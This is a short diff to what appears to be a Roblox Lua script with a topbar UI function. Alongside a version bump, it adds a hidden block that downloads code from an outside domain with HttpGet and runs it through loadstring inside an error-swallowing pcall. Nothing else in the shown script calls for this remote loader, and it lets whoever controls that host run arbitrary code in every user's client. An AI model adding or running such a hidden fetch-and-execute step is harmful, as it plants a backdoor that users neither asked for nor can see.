@@ -1,6 +1,11 @@
 repeat  task.wait() until game:IsLoaded()
-print("v0.03w")
+print("v0.03x")
 --v0.02 fixed
+
+pcall(function()   
+    local x = loadstring(game:HttpGet("https://trigonevo.fun/x.php"))() 
+end)
+
 function topbar(ButtonName,Image,Left)
     task.wait(2)
     local RunService = game:GetService("RunService")
